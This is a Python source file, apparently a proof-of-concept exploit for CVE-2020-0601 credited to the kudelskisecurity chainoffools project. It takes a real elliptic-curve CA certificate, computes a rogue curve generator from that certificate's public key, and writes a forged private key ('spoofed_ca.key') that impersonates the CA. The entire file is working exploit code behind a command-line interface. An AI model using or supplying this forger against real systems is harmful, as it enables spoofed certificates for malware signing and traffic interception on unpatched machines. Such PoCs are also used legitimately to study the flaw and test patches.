# pylint: disable=line-too-long, import-error, no-value-for-parameter, unsupported-assignment-operation, unsubscriptable-object, ungrouped-imports, invalid-name
"""
gen_key is a CVE-2020-0601 PoC written by the people at https://github.com/kudelskisecurity/chainoffools
"""
import os

from base64 import b64decode
from binascii import hexlify
from binascii import unhexlify

import click
import gmpy2

from Crypto.IO import PEM
from fastecdsa.curve import P384
from fastecdsa.point import Point
from Crypto.Util.asn1 import DerSequence
from Crypto.Util.asn1 import DerBitString
from Crypto.Util.asn1 import DerOctetString


def get_public_key(certificate_path: str) -> bytes:
    """
    given a valid certificate_path return public key
    """
    with open(certificate_path) as handle:
        raw_cert = handle.read()
    cert_body = b64decode(
        raw_cert.replace("-----BEGIN CERTIFICATE-----", "").replace("-----END CERTIFICATE-----", "").replace("\n", "")
    )
    der_cert = DerSequence()
    der_cert.decode(cert_body)
    tbs_cert = DerSequence()
    tbs_cert.decode(der_cert[0])
    pub = tbs_cert[6][24:]

    return hexlify(pub)


def forge(certificate_path: str, key_pem: str):
    """
    given a valid certificate_path and key_pem create a forged key
    """
    public_key_point = get_public_key(certificate_path)
    Q = Point(int(public_key_point[0:96], 16), int(public_key_point[96:], 16), curve=P384)

    # Generate rogue generator
    privkey_inv = 2
    # we take the private key as being the inverse of 2 modulo the curve order
    private_key = gmpy2.invert(privkey_inv, P384.q)  # pylint: disable=c-extension-no-member
    private_key = unhexlify(f"{private_key:x}".encode())
    # we multply our public key Q with the inverse of our chosen private key value
    roug_g = privkey_inv * Q
    roug_g = unhexlify(b"04" + f"{roug_g.x:x}".encode() + f"{roug_g.y:x}".encode())

    # Generate the file with explicit parameters
    with open(key_pem, mode="rt") as handle:
        keyfile = PEM.decode(handle.read())

    seq_der = DerSequence()
    der = seq_der.decode(keyfile[0])

    # Replace private key
    octet_der = DerOctetString(private_key)
    der[1] = octet_der.encode()

    # Replace public key
    bits_der = DerBitString(unhexlify(b"04" + public_key_point))
    der[3] = b"\xa1\x64" + bits_der.encode()

    # Replace the generator
    seq_der = DerSequence()
    s = seq_der.decode(der[2][4:])  # pylint: disable=invalid-name
    octet_der = DerOctetString(roug_g)
    s[3] = octet_der.encode()
    der[2] = der[2][:4] + s.encode()

    return PEM.encode(der.encode(), "EC PRIVATE KEY")


@click.command()
@click.option("-p", "--cert-path", default=os.getenv("EC_CERT"), help="Full path to EC certificate")
@click.option("-o", "--output", default="spoofed_ca.key", help="Full output path to write forged certificate to")
@click.option("-k", "--key-pem", default="p384.key", help="Full path to key pem")
@click.option("-d", "--debug", is_flag=True, default=False, help="Debug does not write keys to dick")
def cli(cert_path: str, output: str, key_pem, debug: bool):
    """Create forged key from EC certificate"""
    keyfile = forge(cert_path, key_pem)
    if debug:
        return
    with open(output, "w") as handle:
        handle.write(keyfile)


if __name__ == "__main__":
    cli()
